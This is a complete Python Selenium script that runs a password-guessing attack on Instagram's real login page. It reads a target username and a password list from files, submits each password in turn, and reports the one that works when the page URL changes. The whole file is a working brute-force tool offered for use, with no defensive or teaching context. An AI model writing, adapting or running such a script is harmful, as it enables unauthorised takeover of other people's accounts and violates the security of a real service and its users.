
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time


username_file = input ("Enter the path of the username file: ")
password_file = input ("Enter the path of the password file: ")


with open (username_file, 'r') as file:
    username = file.readline().strip()


with open(password_file, 'r') as file:
    passwords = [line.strip() for line in file.readlines()]


driver = webdriver.Chrome()  # Or use Firefox with webdriver.Firefox()


driver.get("https://www.instagram.com/accounts/login/")
time.sleep(5)  # Wait for the page to load


login_page_url = driver.current_url


login_successful = False
for password in passwords:
   
    driver.refresh()
    time.sleep(5)  # Wait for the page to reload

    
    username_field = driver.find_element(By.NAME, "username")
    password_field = driver.find_element(By.NAME, "password")
    
    
    username_field.clear()
    password_field.clear()

   
    username_field.send_keys(username)
    password_field.send_keys(password)

    
    password_field.send_keys(Keys.RETURN)

    
    time.sleep(10)

    
    current_url = driver.current_url
    if current_url != login_page_url:
        login_successful = True
        print(f"Login successful with username: {username} and password: {password}")
        break
    else:
        print(f"Login failed with password: {password}")


if not login_successful:
    print("All passwords failed. Could not log in.")

driver.quit()
